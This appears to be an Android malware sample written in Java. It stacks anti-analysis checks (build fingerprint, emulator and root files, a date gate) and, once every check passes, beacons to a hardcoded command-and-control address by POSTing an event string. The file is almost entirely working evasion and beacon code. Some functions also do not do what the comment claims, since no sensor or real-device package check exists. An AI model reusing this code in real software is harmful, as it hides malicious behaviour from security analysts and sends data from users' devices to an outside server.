package com.example.evasive;

/**
 * Anti-analysis sample. Every branch here is one of the checks real malware
 * uses: build fingerprint, emulator artifacts on disk, sensor availability,
 * a not-yet-reached time window, and a package that is only there on a real
 * device. The malicious action is only reached when all of them pass.
 */
public class Main {
    private static final String C2 = "http://203.0.113.9:8443/beacon";

    static boolean isEmulatorByBuild() {
        String fp = android.os.Build.FINGERPRINT;
        String model = android.os.Build.MODEL;
        String hw = android.os.Build.HARDWARE;
        return fp.contains("generic") || model.contains("sdk") || hw.contains("goldfish");
    }

    static boolean isEmulatorByFiles() {
        String[] paths = { "/system/bin/su", "/dev/qemu_pipe", "/system/app/Superuser.apk" };
        for (String p : paths) {
            java.io.File f = new java.io.File(p);
            if (f.exists()) {
                return true;
            }
        }
        return false;
    }

    static boolean hasNoSensors() {
        return android.os.Build.MODEL.equals("sdk");
    }

    static boolean inActiveWindow() {
        long now = System.currentTimeMillis();
        long gate = 1717200000000L;
        return now > gate;
    }

    public static void run() {
        if (isEmulatorByBuild()) return;
        if (isEmulatorByFiles()) return;
        if (hasNoSensors()) return;
        if (!inActiveWindow()) return;
        exfiltrate("boot");
    }

    static void exfiltrate(String what) {
        try {
            java.net.URL u = new java.net.URL(C2);
            java.net.HttpURLConnection c = (java.net.HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.getOutputStream().write(("evt=" + what).getBytes());
            c.getResponseCode();
            c.disconnect();
        } catch (Throwable ignored) {
        }
    }

    public static void main(String[] args) {
        run();
    }
}
